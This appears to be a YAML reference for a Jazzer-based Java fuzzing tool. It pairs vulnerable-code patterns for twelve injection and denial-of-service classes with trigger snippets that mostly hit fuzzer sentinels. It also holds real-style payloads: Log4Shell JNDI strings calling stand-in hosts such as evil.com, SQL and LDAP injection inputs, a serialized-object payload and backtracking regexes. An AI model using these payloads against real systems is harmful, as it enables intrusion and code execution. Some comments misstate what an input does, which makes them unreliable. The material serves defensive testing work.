SQLInjection:
  description: |-
    SQL queries built by concatenating user input without escaping.

    Find: String concatenation in SQL statements.
    ```java
    String user = request.getParameter("user");
    String sql = "SELECT * FROM users WHERE name = '" + user + "'";  // BUG: unescaped
    statement.executeQuery(sql);

    // Numeric context
    String id = request.getParameter("id");
    String sql2 = "SELECT * FROM users WHERE id = " + id;  // BUG: no quotes

    // ORDER BY context
    String sort = request.getParameter("sort");
    String sql3 = "SELECT * FROM users ORDER BY " + sort;  // BUG: unescaped
    ```

  exploit: |-
    1. Locate SQL string concatenation
    2. Inject appropriate syntax breaker based on context

    ```java
    String maliciousInput = "'";  // Breaks SQL parsing in quoted context
    String sql = "SELECT * FROM users WHERE name = '" + maliciousInput + "'";
    statement.executeQuery(sql);  // Triggers SQLException

    // OR for numeric context
    String numericInput = "1 OR 1=1--";  // Breaks numeric context
    String sql2 = "SELECT * FROM users WHERE id = " + numericInput;
    statement.executeQuery(sql2);  // Triggers SQLException
    ```

LDAPInjection:
  description: |-
    LDAP queries constructed by concatenating unescaped user input.

    Find: String concatenation building LDAP DN or filters, including multi-valued RDNs.
    ```java
    String username = request.getParameter("user");
    String dn = "cn=" + username + ",dc=example,dc=com";  // BUG: unescaped
    dirContext.search(dn, attrs);

    // Filter context
    String filter = "(uid=" + username + ")";  // BUG: unescaped filter
    dirContext.search(baseDN, filter, controls);
    ```

  exploit: |-
    1. Locate LDAP string concatenation
    2. Inject special character to break syntax

    ```java
    String maliciousInput = "+";  // Breaks LDAP DN parsing
    String dn = "cn=" + maliciousInput + ",dc=example,dc=com";
    dirContext.search(dn, attrs);  // Triggers NamingException

    // OR for filter context
    String filterInput = "*)(uid=admin";  // Breaks filter parsing
    String filter = "(uid=" + filterInput + ")";
    dirContext.search(baseDN, filter, controls);  // Triggers NamingException
    ```

XPathInjection:
  description: |-
    XPath expressions constructed by concatenating unescaped user input.

    Find: String concatenation building XPath expressions, including predicates and functions.
    ```java
    String username = request.getParameter("user");
    String xpath = "/users/user[@name='" + username + "']";  // BUG: unescaped
    xpathObj.compile(xpath);
    ```

  exploit: |-
    1. Locate XPath string concatenation
    2. Inject unmatched quote or bracket to break syntax

    ```java
    String maliciousInput = "alice]";  // Unmatched quote breaks XPath
    String xpath = "/users/user[@name='" + maliciousInput + "']";
    xpathObj.compile(xpath);  // Triggers XPathExpressionException
    ```

OSCommandInjection:
  description: |-
    OS commands executed with user-controlled input.

    Find: Runtime.exec() or ProcessBuilder using user input, including command arrays.
    ```java
    String filename = request.getParameter("file");
    Runtime.getRuntime().exec("cat " + filename);  // BUG: command injection

    // Command array
    String[] cmd = {"/bin/sh", "-c", "ls " + filename};  // BUG: shell injection
    new ProcessBuilder(cmd).start();

    // Direct command
    String command = request.getParameter("cmd");
    Runtime.getRuntime().exec(command);  // BUG: direct command execution
    ```

  exploit: |-
    1. Locate command execution with user input
    2. Execute exact target command "jazze"

    ```java
    Runtime.getRuntime().exec("jazze");  // Exact command name required

    // OR with ProcessBuilder
    new ProcessBuilder("jazze").start();  // Alternative method
    ```

ScriptEngineInjection:
  description: |-
    Scripts evaluated with user-controlled input through JSR-223 engines.

    Find: ScriptEngine.eval() using user input, including Reader and context variants.
    ```java
    String userScript = request.getParameter("script");
    scriptEngine.eval(userScript);  // BUG: arbitrary script execution

    // Reader variant
    Reader reader = new StringReader(userScript);
    scriptEngine.eval(reader);  // BUG: script execution via Reader

    // With context
    ScriptContext context = new SimpleScriptContext();
    scriptEngine.eval(userScript, context);  // BUG: script execution with context
    ```

  exploit: |-
    1. Locate script evaluation with user input
    2. Inject exact target pattern

    ```java
    String maliciousScript = "\"jaz\"+\"zer\"";  // Exact pattern required
    scriptEngine.eval(maliciousScript);  // Triggers detection

    // OR with Reader
    scriptEngine.eval(new StringReader("\"jaz\"+\"zer\""));  // Reader variant
    ```

RegexInjection:
  description: |-
    Regex patterns compiled with user input causing errors or memory exhaustion.

    Find: Pattern.compile() using user input or CANON_EQ flag, vulnerable patterns with user input, and String regex methods.
    ```java
    String userPattern = request.getParameter("pattern");
    Pattern.compile(userPattern);  // BUG: malicious patterns
    Pattern.compile(userInput, Pattern.CANON_EQ);  // BUG: memory exhaustion

    // Vulnerable pattern with user input
    String userInput = request.getParameter("input");
    Pattern.compile("(a+)+").matcher(userInput).matches();  // BUG: catastrophic backtracking

    // String methods
    String text = "data";
    text.replaceAll(userPattern, "replacement");  // BUG: regex in String method
    text.split(userPattern);  // BUG: regex in split
    ```

  exploit: |-
    1. Locate regex compilation with user input
    2. Inject invalid pattern, use CANON_EQ with combining marks, or exploit vulnerable patterns

    ```java
    Pattern.compile("[");  // Unclosed character class
    // OR
    Pattern.compile("\u0300\u0300\u0300", Pattern.CANON_EQ);  // Memory exhaustion
    // OR
    Pattern.compile("(a+)+").matcher("aaaaaaaaaaaaaaaaaaaaX").matches();  // Catastrophic backtracking
    // OR
    "test".replaceAll("[", "x");  // String method variant
    ```

DeserializeObjectInjection:
  description: |-
    Objects deserialized from untrusted data without validation.

    Find: ObjectInputStream.readObject() with external data, including custom streams and wrapped streams.
    ```java
    byte[] data = getUntrustedData();
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject();  // BUG: deserializes malicious objects

    // Custom ObjectInputStream
    class CustomOIS extends ObjectInputStream {
        protected Object readObjectOverride() throws IOException {
            return super.readObject();  // BUG: still vulnerable
        }
    }

    // Wrapped stream
    InputStream wrapped = wrapStream(untrustedData);
    new ObjectInputStream(wrapped).readObject();  // BUG: wrapped but unsafe
    ```

  exploit: |-
    1. Locate ObjectInputStream with external data
    2. Provide serialized jaz.Zer class

    ```java
    byte[] payload = {(byte)0xac, (byte)0xed, 0x00, 0x05, 0x73, 0x72,
                      0x00, 0x07, 'j','a','z','.','Z','e','r',
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2a,
                      0x02, 0x00, 0x00, 0x78, 0x70};
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
    ois.readObject();  // Triggers detection

    // OR with custom stream
    CustomOIS customOis = new CustomOIS(new ByteArrayInputStream(payload));
    customOis.readObject();  // Also triggers detection
    ```

ReflectiveCallInjection:
  description: |-
    Classes or native libraries loaded with user-controlled names.

    Find: Class.forName() or System.loadLibrary() using user input, including ClassLoader variants.
    ```java
    String className = request.getParameter("class");
    Class.forName(className);  // BUG: arbitrary class loading
    String libName = getLibraryName();
    System.loadLibrary(libName);  // BUG: arbitrary library loading

    // ClassLoader variants
    ClassLoader.getSystemClassLoader().loadClass(className);  // BUG: ClassLoader method
    Thread.currentThread().getContextClassLoader().loadClass(className);  // BUG: context loader

    // With initialization
    Class.forName(className, true, classLoader);  // BUG: with initialization flag
    ```

  exploit: |-
    1. Locate dynamic loading with user input
    2. Load EXACT target class/library
      - class name: jaz.Zer
      - library name: jazzer_honeypot

    ```java
    Class.forName("jaz.Zer");  // Exact class name required
    // OR
    System.loadLibrary("jazzer_honeypot");  // Exact library name required
    // OR
    ClassLoader.getSystemClassLoader().loadClass("jaz.Zer");  // ClassLoader variant
    ```

JNDIInjection:
  description: |-
    JNDI lookups performed with user-controlled URLs like Log4Shell (CVE-2021-44228), which lead to remote code execution through malicious LDAP servers or RMI registries, especially in combination with expression injection.

    Find: Context.lookup() using user input, including lookupLink and different context types.
    ```java
    // Direct JNDI lookup
    String userInput = request.getParameter("name");
    Context ctx = new InitialContext();
    Object obj = ctx.lookup(userInput);  // Vulnerable to injection

    // Dynamic service lookup
    String serviceName = getServiceName();  // From untrusted source
    Service service = (Service) context.lookup("ldap://" + serviceName);  // Vulnerable with LDAP
    RemoteService remote = (RemoteService) ctx.lookup("rmi://" + serviceName);  // Vulnerable with RMI

    // Nested in expressions
    String expr = "${jndi:" + userInput + "}";  // BUG: expression language

    // Log4j vulnerability (CVE-2021-44228)
    String userInput = "${jndi:ldap://malicious.com/exploit}";  // LDAP variant
    String rmiInput = "${jndi:rmi://evil.com/exploit}";         // RMI variant
    logger.error("User input: {}", userInput);  // Vulnerable to Log4Shell
    ```

  exploit: |-
    1. Locate JNDI lookup with user input
    2. Use EXACT JNDI URL patterns

    ```java
    Context ctx = new InitialContext();

    // Basic lookups - both protocols work
    ctx.lookup("ldap://g.co/");      // Using LDAP
    ctx.lookup("rmi://g.co/");       // Using RMI

    // With lookupLink - both protocols work
    ctx.lookupLink("ldap://g.co/");  // Using LDAP
    ctx.lookupLink("rmi://g.co/");   // Using RMI

    // Log4j patterns - both protocols work
    logger.info("${jndi:ldap://g.co/}");  // LDAP variant
    logger.error("${jndi:rmi://g.co/}");  // RMI variant
    ```

ServerSideRequestForgery:
  description: |-
    Network connections made to user-controlled destinations.

    Find: Network APIs using user-controlled URLs or hostnames, including HTTP clients and channels.
    ```java
    String url = request.getParameter("url");
    new URL(url).openConnection();  // BUG: arbitrary URL access
    String host = getUserInput();
    new Socket(host, port);  // BUG: arbitrary host connection

    // HTTP clients
    HttpClient client = HttpClient.newHttpClient();
    client.send(HttpRequest.newBuilder().uri(URI.create(url)).build(),
                HttpResponse.BodyHandlers.ofString());  // BUG: HTTP client SSRF

    // Socket channels
    SocketChannel.open(new InetSocketAddress(host, port));  // BUG: channel SSRF
    ```

  exploit: |-
    1. Locate network connection with user input
    2. Connect to EXACT target host

    ```java
    new Socket("jazzer.com", 8080);  // Exact hostname required
    // OR
    HttpClient.newBuilder().build().send(
        HttpRequest.newBuilder().uri(URI.create("http://jazzer.com")).build(),
        HttpResponse.BodyHandlers.ofString());
    // OR
    SocketChannel.open(new InetSocketAddress("jazzer.com", 443));
    ```

FilePathTraversal:
  description: |-
    File operations performed with user-controlled paths.

    Find: File APIs using user input without path validation, including NIO and legacy IO.
    ```java
    String filename = request.getParameter("file");
    new File(baseDir + filename);  // BUG: path traversal possible

    // NIO variants
    Files.readAllBytes(Paths.get(filename));  // BUG: NIO path traversal
    Files.newInputStream(Paths.get(filename));  // BUG: NIO stream

    // Scanner with File
    new Scanner(new File(filename));  // BUG: Scanner file access

    // FileChannel
    FileChannel.open(Paths.get(filename));  // BUG: channel file access
    ```

  exploit: |-
    1. Locate file operation with user input
    2. Use EXACT directory traversal path "../jazzer-traversal"
      * Relative path matching "../jazzer-traversal"
      * Absolute path matching the absolute version of target

    ```java
    Files.readAllBytes(Paths.get("../jazzer-traversal"));  // Exact path required
    // OR
    new FileInputStream("../jazzer-traversal");
    // OR
    new Scanner(new File("../jazzer-traversal"));  // Scanner variant
    ```

TimeoutDenialOfService:
  description: |-
    Loops, excessive recursion, deliberate time-consuming operations occured by user-controlled input.

    - Find: Loops, recursion, sleep using user input for control flow, including
    TimeUnit and recursive calls.
    - Or, Find regex parsing or matching, and check if it can cause slowdown (MUST CHECK THE REGEX PATTERN VALUE!!)

    ```java

    // Infinite loop with user-controlled condition
    int count = Integer.parseInt(request.getParameter("count"));
    while(count > 0) {
        process();  // BUG: missing count-- causes infinite loop
    }

    // Sleep based on user input
    String delayStr = request.getParameter("delay");
    Thread.sleep(Long.parseLong(delayStr));  // BUG: user-controlled delay

    // TimeUnit sleep
    TimeUnit.SECONDS.sleep(Long.parseLong(delayStr));  // BUG: TimeUnit sleep

    // Recursive calls
    int depth = Integer.parseInt(request.getParameter("depth"));
    recursiveMethod(depth);  // BUG: user-controlled recursion depth

    // Regex with catastrophic backtracking
    String text = request.getParameter("text");  // User-controlled
    Pattern.compile("(a+)+").matcher(text).matches();  // Vulnerable pattern

    // Slow Regex processing with user-controllable input
    String text = request.getParameter("text"); // User-controlled (e.g, 99999999999999999999999999999999999999999999999...)
    Pattern.compile("-?\\d{1,19}(?:\\.\\d*)?").matcher(text).matches();  // This can lead slowdown and timed out
    ```

  exploit: |-
    1. Locate loop/sleep/regex with user-controlled input
      1.1. If it's about regex, MUST check the pattern
    2. Provide input causing excessive execution time

    ```java
    int count = 1;  // Any positive number
    while(count > 0) {
        System.out.println("loop");  // Infinite loop - missing count--
    }
    // OR
    Thread.sleep(Long.MAX_VALUE);  // Excessive sleep duration
    // OR
    TimeUnit.HOURS.sleep(24);  // TimeUnit variant
    // OR
    Pattern.compile("(a+)+").matcher("aaaaaaaaaaaaaaaaaaaaX").matches();  // Catastrophic backtracking
    // OR
    Pattern.compile("-?\\d{1,19}(?:\\.\\d*)?").matcher("99999999999999999999999999999999999999999999999").matches();  // Slow Regex processing
    ```
